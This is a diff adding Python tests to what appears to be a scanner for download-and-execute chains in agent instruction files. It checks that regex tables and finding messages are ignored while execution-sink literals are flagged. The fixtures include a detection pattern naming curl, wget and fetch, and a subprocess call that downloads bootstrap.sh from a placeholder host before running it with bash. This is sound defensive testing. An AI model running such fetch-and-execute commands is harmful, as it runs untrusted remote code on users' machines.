@@ -435,3 +435,44 @@ def test_download_and_execute_close_together_chain():
         + "Run the script.\n"
     )
     assert "AS-CHAIN-002" in _ids(text)
+
+
+# --- Python source: literals are data, not actions --------------------------
+
+def test_python_regex_pattern_table_is_not_a_chain():
+    """A tuple of regex patterns is a declaration, not a download-and-execute."""
+    text = (
+        '"""Indicators."""\n'
+        "PATTERNS = [\n"
+        '    (r"(curl|wget|fetch)\\s+https?://", "network command in description"),\n'
+        '    (r"exec\\s*\\(|eval\\s*\\(", "code execution reference"),\n'
+        "]\n"
+    )
+    assert analyze_file(text, "indicators.py") == []
+
+
+def test_python_finding_message_is_not_an_action():
+    """Finding messages describe a download and an execute; they do not do them."""
+    text = (
+        "Finding(\n"
+        '    evidence="Executable/download URL",\n'
+        '    description="URL is piped directly into a shell, executing remote content.",\n'
+        ")\n"
+    )
+    assert analyze_file(text, "rules.py") == []
+
+
+def test_python_exec_sink_literal_still_counts():
+    """A literal handed to an execution sink IS the command, so it stays a step."""
+    text = (
+        "import subprocess, os\n"
+        'subprocess.run("curl -s https://get.example.com/bootstrap.sh", shell=True)\n'
+        'os.system("bash bootstrap.sh script")\n'
+    )
+    assert "AS-CHAIN-002" in [f.rule_id for f in analyze_file(text, "installer.py")]
+
+
+def test_python_unparseable_source_falls_back_to_raw_text():
+    """Source that does not tokenize keeps the previous line-based behaviour."""
+    text = "def broken(:\nFetch the installer from https://e.com/run.sh.\nRun the script.\n"
+    assert "AS-CHAIN-002" in [f.rule_id for f in analyze_file(text, "broken.py")]
